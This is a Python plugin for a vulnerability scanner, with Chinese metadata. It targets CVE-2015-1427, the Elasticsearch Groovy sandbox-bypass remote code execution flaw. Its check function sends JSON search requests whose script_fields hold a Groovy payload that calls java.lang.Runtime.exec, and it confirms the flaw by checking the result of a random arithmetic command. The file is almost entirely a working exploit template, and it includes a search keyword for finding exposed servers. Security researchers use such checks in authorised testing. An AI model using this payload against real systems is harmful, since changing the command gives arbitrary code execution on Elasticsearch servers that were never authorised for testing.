# -*- encoding:utf-8 -*-

import requests
import json
import random

def get_plugin_info():
    plugin_info = {
        "name": "Elasticsearch groovy沙箱绕过RCE",
        "info": "Elasticsearch中1.3.7之前的1.4和1.4.4之前的Groovy脚本引擎允许远程攻击者绕过沙箱保护机制并通过精心编写的脚本执行任意shell命令。CVE-2015-1427",
        "level": "紧急",
        "type": "代码执行",
        "author": "muYo@bg",
        "url": "https://github.com/S4kur4/Sepia/blob/master/script/elasticsearch_groovy_rce.py",
        "keyword": "server:elasticsearch",
        "source": 1
    }
    return plugin_info

header = {
    "User-Agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:46.0) Gecko/20100101 Firefox/46.0",
    "Connection" : "keep-alive",
    "Accept" : "*/*",
    "Accept-Encoding" : "deflate",
    "Accept-Language" : "zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4"
    }

def check(ip, port, timeout=5):
    url = 'http://' + ip +':'+ port
    try:
        a = random.randint(10000000, 20000000)
        b = random.randint(10000000, 20000000)
        c = a + b
        win = 'set /a ' + str(a) + ' + ' + str(b)
        linux = 'expr ' + str(a) + ' + ' + str(b)

        data1 = """{"size":1, "script_fields": {"lupin":{"script": "java.lang.Math.class.forName(\\"java.lang.Runtime\\").getRuntime().exec(\\"%s\\").getText()"}}}""" % win
        data2 = """{"size":1, "script_fields": {"lupin":{"script": "java.lang.Math.class.forName(\\"java.lang.Runtime\\").getRuntime().exec(\\"%s\\").getText()"}}}""" % linux
        response1 = requests.get(url=url, headers=header, data=data1, timeout=timeout)
        response2 = requests.get(url=url, headers=header, data=data2, timeout=timeout)
        response1_json = json.loads(response1.text)
        response2_json = json.loads(response2.text)
        if response1_json['hits']['hits']:
            value1 = response1_json['hits']['hits'][0]['fields']['lupin'][0].strip()
            if value1 == str(c):
                return u'Elasticsearch groovy沙箱绕过RCE'
        if response2_json['hits']['hits']:
            value2 = response2_json['hits']['hits'][0]['fields']['lupin'][0].strip()
            if value2 == str(c):
                return u'Elasticsearch groovy沙箱绕过RCE'
        return False
    except:
        pass